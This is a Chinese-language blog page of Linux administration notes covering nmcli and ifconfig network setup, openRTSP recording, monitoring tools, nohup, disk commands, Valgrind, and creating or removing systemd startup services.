<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[main]</span></span><br><span class="line"><span class="attr">plugins</span>=ifupdown,keyfile</span><br><span class="line"></span><br><span class="line"><span class="section">[ifupdown]</span></span><br><span class="line"><span class="attr">managed</span>=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>创建一个新的网络连接：使用 <code>nmcli</code> 命令创建一个新的网络连接，并指定连接的类型、名称和设备。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmcli connection add <span class="built_in">type</span> ethernet con-name &lt;connection-name&gt; ifname &lt;interface-name&gt; ipv4.method manual ipv4.addresses &lt;ip-address&gt;/&lt;subnet-mask&gt; ipv4.gateway &lt;gateway-address&gt; ipv4.dns &lt;dns-server&gt;</span><br></pre></td></tr></table></figure>

<p>在上述命令中，将 <code>&lt;connection-name&gt;</code> 替换为连接的名称，<code>&lt;interface-name&gt;</code> 替换为网络接口的名称（如 eth0、enp0s3 等），<code>&lt;ip-address&gt;</code> 替换为静态 IP 地址，<code>&lt;subnet-mask&gt;</code> 替换为子网掩码，<code>&lt;gateway-address&gt;</code> 替换为默认网关的 IP 地址，<code>&lt;dns-server&gt;</code> 替换为 DNS 服务器的 IP 地址。</p>
<p>例如，创建名为 “static-eth0” 的静态以太网连接，IP 地址为 “192.168.1.100&#x2F;24”，默认网关为 “192.168.1.1”，DNS 服务器为 “8.8.8.8”，可以使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmcli connection add <span class="built_in">type</span> ethernet con-name static-eth0 ifname eth0 ipv4.method manual ipv4.addresses 192.168.1.100/24 ipv4.gateway 192.168.1.1 ipv4.dns 8.8.8.8</span><br></pre></td></tr></table></figure>
</li>
<li><p>激活静态连接：使用 <code>nmcli</code> 命令激活刚创建的静态连接。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmcli connection up &lt;connection-name&gt;</span><br></pre></td></tr></table></figure>

<p>将 <code>&lt;connection-name&gt;</code> 替换为之前创建的静态连接的名称。</p>
</li>
</ol>
<p>完成上述步骤后，NetworkManager 将使用你指定的静态 IP 地址、子网掩码、默认网关和 DNS 服务器配置网络接口。你可以使用 <code>nmcli connection show</code> 命令来查看连接状态和详细信息。</p>
<p>请注意，这些步骤假定你已经知道要使用的静态 IP 地址、子网掩码、默认网关和 DNS 服务器的正确值。确保将这些值替换为你实际使用的网络配置。</p>
<p>希望这些步骤能帮助你成功配置静态 IP 地址！如有更多问题，请随时提问。</p>
<h2 id="openRTSP-录制视频"><a href="#openRTSP-录制视频" class="headerlink" title="openRTSP 录制视频"></a>openRTSP 录制视频</h2><p>在 Linux 上使用 OpenRTSP 工具录制视频，你可以使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openRTSP -4 -D &lt;duration&gt; -F &lt;output_file&gt; &lt;RTSP_URL&gt;</span><br><span class="line"></span><br><span class="line">openRTSP  -b 5000000 -D 0 -F ./0715.mp4 rtsp://admin:a1234567@192.169.7.125:554</span><br></pre></td></tr></table></figure>

<p>解释一下这些参数的含义：</p>
<ul>
<li><code>-b</code>: 设置文件输出缓冲区</li>
<li><code>-4</code>: 强制使用 IPv4 进行通信。</li>
<li><code>-D &lt;duration&gt;</code>: 指定录制的时长（以秒为单位）。你可以设置具体的录制时间，或使用 <code>-D 0</code> 来录制直到手动停止。</li>
<li><code>-F &lt;output_file&gt;</code>: 指定输出文件的路径和文件名。例如，<code>/path/to/output.mp4</code>。</li>
<li><code>&lt;RTSP_URL&gt;</code>: RTSP 服务器的 URL，指定要录制的流的位置。</li>
</ul>
<p>示例命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openRTSP -4 -D 60 -F /path/to/output.mp4 rtsp://example.com/live/stream</span><br></pre></td></tr></table></figure>

<p>这将从指定的 RTSP URL 开始录制视频，并将其保存到指定的输出文件中。录制时长为 60 秒。</p>
<p>请注意，OpenRTSP 工具会尝试从 RTSP 服务器获取媒体流并将其保存为文件。确保你具有从服务器获取流的权限，并且服务器正确配置以提供流媒体数据。如果录制的媒体流有加密或其他保护机制，你可能需要提供相应的凭证或密钥。</p>
<p>另外，OpenRTSP 生成的视频文件可能采用 MPEG4 格式进行编码，你可以使用适当的视频播放器或转码工具来播放或转换录制的视频文件。</p>
<h2 id="linux-资源监控-第三方工具"><a href="#linux-资源监控-第三方工具" class="headerlink" title="linux 资源监控 第三方工具"></a>linux 资源监控 第三方工具</h2><p>在Linux系统上，有许多第三方工具可以用于资源监控。以下是一些常用的推荐工具：</p>
<ol>
<li><p><strong>top</strong>: <code>top</code> 是一个基本的命令行工具，用于实时监控系统的进程活动和资源使用情况。它显示了CPU使用率、内存使用情况、进程列表等信息，并按照CPU使用率进行排序。</p>
</li>
<li><p><strong>htop</strong>: <code>htop</code> 是 <code>top</code> 命令的增强版本，提供了更直观的界面和更多的功能。它支持鼠标交互，并提供了更详细的系统信息和进程管理选项。</p>
</li>
<li><p><strong>nmon</strong>: <code>nmon</code> 是一个全面的系统监控工具，可以提供对CPU、内存、磁盘、网络等各个方面的实时数据监测和报告。它以交互式的方式显示系统状态，并可以生成历史数据报告供后续分析。</p>
</li>
<li><p><strong>Glances</strong>: <code>Glances</code> 是一个跨平台的系统监控工具，提供了实时的系统信息和性能指标。它以终端界面形式展示，支持多种插件和扩展，可以监控CPU、内存、磁盘、网络、传感器等方面的数据。</p>
</li>
<li><p><strong>sar</strong>: <code>sar</code>（System Activity Reporter）是一个强大的系统性能监测工具，可以收集并报告系统的各种资源使用情况。它可以生成详细的报告，包括CPU使用率、内存使用情况、磁盘IO、网络流量等指标。</p>
</li>
<li><p><strong>iftop</strong>: <code>iftop</code> 是一个网络流量监控工具，可以实时显示网络接口的流量使用情况。它以交互式的方式展示流量信息，并按流量大小排序。</p>
</li>
</ol>
<p>这些工具都提供了不同层次的资源监控和系统性能分析功能。根据你的需求和个人喜好，选择适合你的工具进行资源监控。</p>
<hr>
<h2 id="进程分离到后台"><a href="#进程分离到后台" class="headerlink" title="进程分离到后台"></a>进程分离到后台</h2><p>在 Linux 中，您可以通过多种方式将进程启动并分离到后台运行。下面介绍两种常见的方法：</p>
<ol>
<li><p>使用 “&amp;” 符号：在命令行中启动进程时，可以在命令的末尾添加 “&amp;” 符号。这将使进程在后台运行，而不会阻塞当前终端。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./myprocess &amp;</span><br></pre></td></tr></table></figure>

<p>上述命令将名为 “myprocess” 的可执行文件启动为后台进程。</p>
<p>请注意，当使用该方法启动进程后，终端可能仍然会显示一些输出信息。为了完全将进程与终端分离，可以将进程的标准输入、输出和错误重定向到其他地方，如 <code>/dev/null</code>。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./myprocess &gt; /dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>

<p>上述命令将进程的输出和错误都重定向到 <code>/dev/null</code>，这样进程就不会在终端上产生任何输出。</p>
</li>
<li><p>使用 nohup 命令：另一种方法是使用 nohup 命令。nohup 命令可以在后台运行进程，并将其与终端完全分离。使用 nohup 命令的基本语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup command &amp;</span><br></pre></td></tr></table></figure>

<p>例如，要在后台运行名为 “myprocess” 的可执行文件，可以执行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./myprocess &amp;</span><br></pre></td></tr></table></figure>

<p>使用 nohup 命令启动的进程会将标准输出和标准错误输出重定向到一个名为 “nohup.out” 的文件中。如果您不希望生成 “nohup.out” 文件，可以将输出重定向到 <code>/dev/null</code>，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./myprocess &gt; /dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>

<p>这样可以将进程的输出完全丢弃，而不会写入文件。</p>
</li>
</ol>
<p>使用上述方法之一启动进程并将其分离到后台后，您可以关闭终端，进程将继续在后台运行。请注意，分离到后台的进程仍然与父进程（通常是 init 进程）相关联，但不再与当前终端会话相关联。</p>
<hr>
<h2 id="查看目录下的文件数量"><a href="#查看目录下的文件数量" class="headerlink" title="查看目录下的文件数量"></a>查看目录下的文件数量</h2><p>要查看Linux系统中目录下的文件数量，可以使用<code>ls</code>命令结合一些选项和管道操作来实现。下面是一些常用的方法：</p>
<ol>
<li><p>使用<code>ls</code>命令的<code>-l</code>选项来列出目录中的文件详细信息，并将结果通过管道传递给<code>wc</code>命令统计行数。由于<code>ls</code>命令会列出文件和子目录，因此需要减去1来排除目录本身。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l &lt;directory&gt; | grep <span class="string">&quot;^-&quot;</span> | <span class="built_in">wc</span> -l</span><br></pre></td></tr></table></figure>

<p>将<code>&lt;directory&gt;</code>替换为要查看的目录路径。</p>
</li>
<li><p>使用<code>find</code>命令递归地查找目录下的所有文件，并将结果通过管道传递给<code>wc</code>命令统计行数。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &lt;directory&gt; -<span class="built_in">type</span> f | <span class="built_in">wc</span> -l</span><br></pre></td></tr></table></figure>

<p>将<code>&lt;directory&gt;</code>替换为要查看的目录路径。</p>
</li>
</ol>
<p>这些方法可以帮助您统计目录下的文件数量。请注意，这些方法只会计算目录中的文件数量，不包括子目录。如果要包括子目录中的文件数量，请使用递归选项。</p>
<p>希望这对您有所帮助。如有其他问题，请随时提问。</p>
<hr>
<h2 id="ifconfig-配置指定网口ip"><a href="#ifconfig-配置指定网口ip" class="headerlink" title="ifconfig 配置指定网口ip"></a>ifconfig 配置指定网口ip</h2><p>要使用<code>ifconfig</code>命令配置指定网口的IP地址，请按照以下步骤操作：</p>
<ol>
<li><p>打开终端并使用root权限或sudo命令切换到管理员身份。</p>
</li>
<li><p>使用以下命令查看当前可用的网络接口列表：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig -a</span><br></pre></td></tr></table></figure>

<p>在列表中找到您要配置IP地址的网络接口名称。通常以<code>eth0</code>、<code>eth1</code>、<code>enp0sX</code>或类似的形式命名。</p>
</li>
<li><p>使用以下命令设置指定网口的IP地址：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig &lt;interface&gt; &lt;ip_address&gt; netmask &lt;netmask&gt;</span><br></pre></td></tr></table></figure>

<p>将<code>&lt;interface&gt;</code>替换为您要配置IP地址的网络接口名称，<code>&lt;ip_address&gt;</code>替换为您想要设置的IP地址，<code>&lt;netmask&gt;</code>替换为子网掩码。</p>
<p>例如，如果要将<code>eth0</code>接口的IP地址设置为<code>192.168.0.10</code>，子网掩码为<code>255.255.255.0</code>，则命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.0.10 netmask 255.255.255.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>验证IP地址是否已成功设置。使用以下命令检查指定网口的IP地址：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig &lt;interface&gt;</span><br></pre></td></tr></table></figure>

<p>将<code>&lt;interface&gt;</code>替换为您配置IP地址的网络接口名称。</p>
</li>
</ol>
<p>请注意，使用<code>ifconfig</code>命令配置的IP地址是临时的，重启系统后将失效。如果您想要永久配置静态IP地址，请参考之前提供的方法，编辑网络配置文件并应用配置。</p>
<p>希望这对您有所帮助。如有其他问题，请随时提问。</p>
<h2 id="获取磁盘信息"><a href="#获取磁盘信息" class="headerlink" title="获取磁盘信息"></a>获取磁盘信息</h2><p>在Linux中，可以使用一些命令来获取磁盘信息。以下是几个常用的命令：</p>
<ol>
<li><p>df命令：用于显示文件系统的磁盘空间使用情况。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df -h</span><br></pre></td></tr></table></figure>
<p>该命令将显示每个文件系统的总容量、已使用空间、可用空间以及挂载点。</p>
</li>
<li><p>du命令：用于查看文件和目录的磁盘使用情况。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">du -sh &lt;目录路径&gt;</span><br></pre></td></tr></table></figure>
<p>该命令将显示指定目录的总大小。</p>
</li>
<li><p>lsblk命令：用于列出块设备信息，包括硬盘、分区和挂载点。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsblk</span><br></pre></td></tr></table></figure>
<p>该命令将显示系统中的块设备列表，包括设备名称、大小、类型等。</p>
</li>
<li><p>fdisk命令：用于查看磁盘分区表信息。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo fdisk -l</span><br></pre></td></tr></table></figure>
<p>该命令将显示系统上的磁盘分区信息，包括磁盘设备名称、分区大小、类型等。</p>
</li>
<li><p>smartctl命令：用于获取硬盘的SMART（自监测、分析和报告技术）信息。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo smartctl -a /dev/sda</span><br></pre></td></tr></table></figure>
<p>该命令将显示指定磁盘的SMART属性和状态信息。</p>
</li>
</ol>
<p>这些命令可以帮助您获取有关磁盘空间、分区、挂载点和硬盘状态的信息。根据您的具体需求，选择适当的命令来获取所需的磁盘信息。</p>
<hr>
<h2 id="valgrind-使用技巧"><a href="#valgrind-使用技巧" class="headerlink" title="valgrind 使用技巧"></a>valgrind 使用技巧</h2><p>当使用 Valgrind 进行代码分析时，以下是一些常用的技巧和建议：</p>
<ol>
<li><p>针对特定问题使用适当的 Valgrind 工具：Valgrind 工具集包含多个工具，如 Memcheck、Cachegrind、Massif 等，每个工具都有不同的功能和用途。根据你要解决的具体问题，选择适合的工具进行分析。</p>
</li>
<li><p>使用合适的选项和参数：Valgrind 提供了多种选项和参数来控制分析的行为。根据你的需求，设置合适的选项，如内存泄漏检查、调试服务器、堆栈跟踪等。阅读 Valgrind 的文档以了解可用选项和参数，并根据实际情况进行设置。</p>
</li>
<li><p>关注 Valgrind 的警告和报告：Valgrind 会生成警告和报告，指示可能存在的内存错误、泄漏、未初始化变量等问题。仔细阅读和理解这些报告，并根据提示进行代码的修复和优化。</p>
</li>
<li><p>使用 Valgrind 工具的辅助工具：Valgrind 提供了一些辅助工具，如 <code>ms_print</code>（用于分析 Massif 输出）、<code>callgrind_annotate</code>（用于分析 Callgrind 输出）等。使用这些工具可以更好地可视化和分析 Valgrind 的结果。</p>
</li>
<li><p>分析程序的热点代码：通过查看 Valgrind 的报告和分析结果，识别程序中的热点代码，即执行次数多、内存占用高或性能消耗大的代码段。针对这些热点代码进行优化，可以显著改善程序的性能和资源使用情况。</p>
</li>
<li><p>结合调试器使用：Valgrind 和调试器（如 GDB）可以一起使用，以深入分析程序的问题。你可以在 Valgrind 报告中找到有关内存错误和泄漏的信息，然后使用调试器定位具体的代码位置并进行调试。</p>
</li>
<li><p>针对大型程序进行分析：对于大型程序，Valgrind 的分析可能会耗费较长时间和大量内存。在这种情况下，可以使用 Valgrind 的部分功能，如 <code>--tool=memcheck --leak-check=no</code>，只对内存错误进行检查，以加快分析速度。</p>
</li>
<li><p>测试不同的输入数据和场景：Valgrind 的分析结果可能会受到不同的输入数据和场景的影响。尝试使用不同的测试数据和场景来验证程序的内存安全性和性能，以充分覆盖各种情况。</p>
</li>
</ol>
<p>最重要的是，要仔细阅读 Valgrind 的文档，理解各个工具的原理和用法，并根据</p>
<p>实际情况灵活应用。同时，要结合其他调试和性能分析工具，以获取更全面的代码分析和优化结果。</p>
<h2 id="valgrind-结果输出到文件"><a href="#valgrind-结果输出到文件" class="headerlink" title="valgrind 结果输出到文件"></a>valgrind 结果输出到文件</h2><p>要将 Valgrind 的结果输出到文件中，可以使用重定向操作符（<code>&gt;</code>）将 Valgrind 的输出重定向到一个文件。下面是一个示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">valgrind --tool=memcheck ./my_program &gt; valgrind_output.txt</span><br></pre></td></tr></table></figure>

<p>在上述示例中，<code>valgrind_output.txt</code> 是要保存 Valgrind 输出的文件名。运行命令后，Valgrind 的输出将会写入该文件中，而不会显示在终端上。</p>
<p>如果你想要将标准错误（stderr）也输出到文件中，可以使用 <code>2&gt;&amp;1</code> 重定向标准错误到标准输出，然后再重定向到文件中。示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">valgrind --tool=memcheck ./my_program &gt; valgrind_output.txt 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>在这个示例中，<code>2&gt;&amp;1</code> 将标准错误重定向到标准输出，然后将标准输出和标准错误都重定向到 <code>valgrind_output.txt</code> 文件中。</p>
<p>通过将 Valgrind 输出到文件中，你可以随时打开文件来查看和分析 Valgrind 的结果，以便更好地理解和解决程序中的内存错误和问题。</p>
<h2 id="Linux-systemctl-删除服务"><a href="#Linux-systemctl-删除服务" class="headerlink" title="Linux systemctl 删除服务"></a>Linux systemctl 删除服务</h2><p>要从 Systemd 中删除服务条目（service），可以按照以下步骤进行操作：</p>
<ol>
<li>停止服务：<br>在删除服务之前，首先需要停止该服务。使用以下命令停止服务：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl stop servicename</span><br></pre></td></tr></table></figure>

<p>请将 <code>servicename</code> 替换为你要删除的服务的名称。</p>
<ol start="2">
<li>禁用服务：<br>使用以下命令禁用服务，以确保在系统启动时不会自动启动该服务：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">disable</span> servicename</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>删除服务文件：<br>服务文件通常位于 <code>/etc/systemd/system/</code> 或 <code>/usr/lib/systemd/system/</code> 目录中，具体取决于你的 Linux 发行版和配置。使用以下命令删除服务文件：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> /etc/systemd/system/servicename.service</span><br></pre></td></tr></table></figure>

<p>请确保将 <code>servicename.service</code> 替换为你要删除的服务文件的实际名称。</p>
<ol start="4">
<li>重新加载 Systemd 配置：<br>删除服务文件后，需要重新加载 Systemd 配置，以确保系统知道该服务已被删除。使用以下命令重新加载配置：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl daemon-reload</span><br></pre></td></tr></table></figure>

<p>完成上述步骤后，服务条目就会从 Systemd 中彻底删除。</p>
<p>请注意，在执行这些操作时要谨慎，确保你要删除的是正确的服务条目，并备份相关文件以防需要恢复。</p>
<hr>
<h2 id="Linux-自启动脚本-详解"><a href="#Linux-自启动脚本-详解" class="headerlink" title="Linux 自启动脚本 详解"></a>Linux 自启动脚本 详解</h2><p>在 Linux 系统中，可以使用不同的方法设置自启动脚本，具体取决于你所使用的 Linux 发行版和 init 系统。</p>
<p>在大多数现代 Linux 发行版中，常见的 init 系统是 Systemd。下面是使用 Systemd 设置自启动脚本的步骤：</p>
<ol>
<li>编写启动脚本：<br>在 Linux 系统上创建你的自启动脚本。脚本可以是 Bash 脚本或其他可执行脚本。确保脚本具有可执行权限。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 你的启动脚本命令</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;System is starting. Do something here...&quot;</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>将脚本放置到适当的位置：<br>将脚本复制到一个适当的位置，以便系统可以找到它。通常，可以将自启动脚本放置在 <code>/etc/init.d/</code> 或 <code>/etc/systemd/system/</code> 目录中。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> my_startup.sh /etc/systemd/system/</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>创建 Systemd 服务单元文件：<br>在 Systemd 的服务单元目录中创建一个文件，并添加以下内容：</li>
</ol>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=My Startup Script</span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">ExecStart</span>=/path/to/my_startup.sh</span><br><span class="line"></span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=multi-user.target</span><br></pre></td></tr></table></figure>

<p>在上面的配置中：</p>
<ul>
<li><code>Description</code>：描述此服务的信息。</li>
<li><code>ExecStart</code>：指定要执行的启动脚本的路径。</li>
</ul>
<ol start="4">
<li>重新加载 Systemd：<br>在创建或修改 Systemd 服务单元文件后，需要重新加载 Systemd 配置。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl daemon-reload</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>启用服务：<br>将刚刚创建的服务设置为自启动。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> my_startup.service</span><br></pre></td></tr></table></figure>

<p>现在，你的启动脚本 <code>my_startup.sh</code> 将在系统启动时自动执行。可以通过重启系统来测试自启动脚本是否正常工作。</p>
<p>请注意，不同的 Linux 发行版和 init 系统可能有所不同。如果你使用的是其他 init 系统（如 SysV init），则需要使用不同的方法来设置自启动脚本。建议查阅所使用 Linux 发行版的文档以获取更详细的指导。</p>
<hr>
<h2 id="ubuntu20-自启动脚本"><a href="#ubuntu20-自启动脚本" class="headerlink" title="ubuntu20 自启动脚本"></a>ubuntu20 自启动脚本</h2><p>在 Ubuntu 20.04 中，你可以使用 Systemd 来设置自启动脚本。Systemd 是一个系统和服务管理器，可以用于配置和管理系统上运行的服务、进程和自启动脚本。</p>
<p>以下是在 Ubuntu 20.04 中设置自启动脚本的步骤：</p>
<ol>
<li>编写启动脚本：<br>在 Ubuntu 20.04 上创建你的自启动脚本。比如，你可以在 <code>/usr/local/bin/</code> 目录下创建一个名为 <code>my_startup.sh</code> 的脚本。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 你的启动脚本命令</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;System is starting. Do something here...&quot;</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>设置脚本权限：<br>确保脚本具有可执行权限。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x /usr/local/bin/my_startup.sh</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>创建 Systemd 服务单元文件：<br>在 <code>/etc/systemd/system/</code> 目录下，创建一个名为 <code>my_startup.service</code> 的文件，并添加以下内容：</li>
</ol>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=My Startup Script</span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">Type</span>=simple</span><br><span class="line"><span class="attr">ExecStart</span>=/usr/local/bin/my_startup.sh</span><br><span class="line"></span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=multi-user.target</span><br></pre></td></tr></table></figure>

<p>在上面的配置中：</p>
<ul>
<li><code>Description</code>：描述此服务的信息。</li>
<li><code>ExecStart</code>：指定要执行的启动脚本的路径。</li>
</ul>
<ol start="4">
<li>重新加载 Systemd：<br>在创建或修改 Systemd 服务单元文件后，需要重新加载 Systemd 配置。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl daemon-reload</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>启用服务：<br>将刚刚创建的服务设置为自启动。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> my_startup.service</span><br></pre></td></tr></table></figure>

<p>现在，你的启动脚本 <code>my_startup.sh</code> 将在系统启动时自动执行。可以通过重启系统来测试自启动脚本是否正常工作。</p>
<p>请确保在编写脚本和配置 Systemd 服务单元文件时，路径和权限设置都是正确的。这样就能够确保你的自启动脚本在系统启动时可靠地执行。</p>
<hr>
<h2 id="重启系统"><a href="#重启系统" class="headerlink" title="重启系统"></a>重启系统</h2><p>在 <code>systemd</code> 下，可以使用 <code>systemctl</code> 命令来执行与重启系统相关的操作。以下是一些常用的 <code>systemctl</code> 命令及其说明：</p>
<ol>
<li><p><code>reboot</code>：用于重启系统。执行此命令会向系统发送重启信号，导致系统重新启动。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl reboot</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>poweroff</code>：用于关闭系统。执行此命令会向系统发送关闭信号，导致系统完全关闭。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl poweroff</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>halt</code>：用于停止系统。执行此命令会向系统发送停止信号，导致系统停止运行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl halt</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>suspend</code>：用于挂起系统。执行此命令会将系统置于挂起状态，节省电源但保留系统状态。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl suspend</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>hibernate</code>：用于休眠系统。执行此命令会将系统置于休眠状态，将内存中的内容保存到磁盘，以便稍后恢复。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl hibernate</span><br></pre></td></tr></table></figure></li>
</ol>
<p>需要注意的是，执行上述命令通常需要超级用户权限（使用 <code>sudo</code> 或以 <code>root</code> 用户身份运行）。</p>
<p>此外，还可以使用 <code>shutdown</code> 命令来执行系统重启操作，该命令提供了更多选项和参数以灵活控制系统的行为。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_url/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
